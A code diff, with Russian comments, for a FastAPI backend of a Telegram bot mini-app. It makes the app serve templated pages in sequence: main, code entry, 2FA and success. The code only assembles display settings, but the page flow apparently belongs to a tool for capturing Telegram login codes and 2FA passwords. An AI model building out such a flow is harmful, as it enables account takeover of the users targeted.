@@ -23,19 +23,20 @@ from fastapi.responses import HTMLResponse
 
 from database import get_bot_by_tg_id, get_template, init_db
 from directlink_service import get_module
-from miniapp_template import ALL_DEFAULTS
+from miniapp_template import ALL_DEFAULTS, PAGE_FIELDS, PAGES, page_field_key
 
 _MINIAPP_HTML = (Path(__file__).parent / "miniapp.html").read_text(encoding="utf-8")
 
 
 def _miniapp_config(bot_id: int) -> dict:
-    """Оформление и контент главной страницы мини-аппа из шаблона бота.
+    """Оформление и контент всех страниц (листов) мини-аппа из шаблона бота.
 
-    Берём поля главной страницы (эмодзи/текст/кнопка) с подстановкой
-    дефолтов «Стандартного шаблона», чтобы мини-апп показывал реальный
-    контент, а не заглушку, даже если поле в шаблоне не заполняли.
+    Отдаём страницы в порядке прохождения (Главная → Ввод кода → 2FA →
+    Успех), каждую со всеми под-полями и подстановкой дефолтов «Стандартного
+    шаблона». Мини-апп проигрывает их по кнопкам — для проверки рендера и
+    параметров; бекенд-логика (проверка кода/2FA) подключается отдельно.
     """
-    cfg = {"color": "", "bg": "", "blur": 0, "emoji": "", "text": "", "button": ""}
+    cfg: dict = {"color": "", "bg": "", "blur": 0, "pages": []}
     content: dict = {}
     bot = get_bot_by_tg_id(bot_id)
     if bot and bot.get("template_id"):
@@ -53,9 +54,11 @@ def _miniapp_config(bot_id: int) -> dict:
     cfg["color"] = "" if color in ("", "default") else color
     cfg["bg"] = content.get("bg") or ""
     cfg["blur"] = int(content.get("blur") or 0)
-    cfg["emoji"] = _val("main_emoji")
-    cfg["text"] = _val("main_text")
-    cfg["button"] = _val("main_button")
+    for page in PAGES:  # порядок: main, code, twofa, success
+        pdata = {"key": page}
+        for field, _label in PAGE_FIELDS[page]:
+            pdata[field] = _val(page_field_key(page, field))
+        cfg["pages"].append(pdata)
     return cfg
 
 
